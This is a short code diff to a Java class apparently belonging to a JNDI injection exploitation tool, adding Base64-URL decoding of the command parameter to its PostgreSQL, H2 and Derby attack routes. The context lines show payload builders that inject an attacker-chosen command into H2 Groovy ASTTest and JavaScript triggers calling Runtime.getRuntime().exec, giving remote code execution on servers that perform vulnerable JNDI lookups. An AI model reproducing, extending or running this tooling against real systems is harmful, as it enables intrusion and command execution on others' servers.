@@ -70,6 +70,7 @@ public class DatabaseController implements Controller {
 
     @JNDIMapping("/PostgreSQL/Command/{cmd}")
     public Properties postgresqlCommand(String cmd) {
+        cmd = MiscUtil.tryBase64UrlDecode(cmd);
         System.out.println("[PostgreSQL] Cmd: " + cmd);
 
         String fileName = MiscUtil.getRandStr(12) + ".xml";
@@ -102,6 +103,7 @@ public class DatabaseController implements Controller {
 
     @JNDIMapping("/H2/Java/{cmd}")
     public Properties h2Java(String cmd) {
+        cmd = MiscUtil.tryBase64UrlDecode(cmd);
         System.out.println("[H2] [Java] Cmd: " + cmd);
 
         String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
@@ -117,6 +119,7 @@ public class DatabaseController implements Controller {
 
     @JNDIMapping("/H2/Groovy/{cmd}")
     public Properties h2Groovy(String cmd) {
+        cmd = MiscUtil.tryBase64UrlDecode(cmd);
         System.out.println("[H2] [Groovy] Cmd: " + cmd);
 
         String groovy = "@groovy.transform.ASTTest(value={" + " assert java.lang.Runtime.getRuntime().exec(\"" + cmd + "\")" + "})" + "def x";
@@ -131,6 +134,7 @@ public class DatabaseController implements Controller {
 
     @JNDIMapping("/H2/JavaScript/{cmd}")
     public Properties h2JavaScript(String cmd) {
+        cmd = MiscUtil.tryBase64UrlDecode(cmd);
         System.out.println("[H2] [JavaScript] Cmd: " + cmd);
 
         String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"" + cmd + "\")";
@@ -213,6 +217,7 @@ public class DatabaseController implements Controller {
 
     @JNDIMapping("/Derby/Command/{database}/{cmd}")
     public Properties derbyCommand(String database, String cmd) {
+        cmd = MiscUtil.tryBase64UrlDecode(cmd);
         System.out.println("[Derby] [Command] Cmd: " + cmd);
 
         String url = "jdbc:derby:memory:" + database + ";create=true";
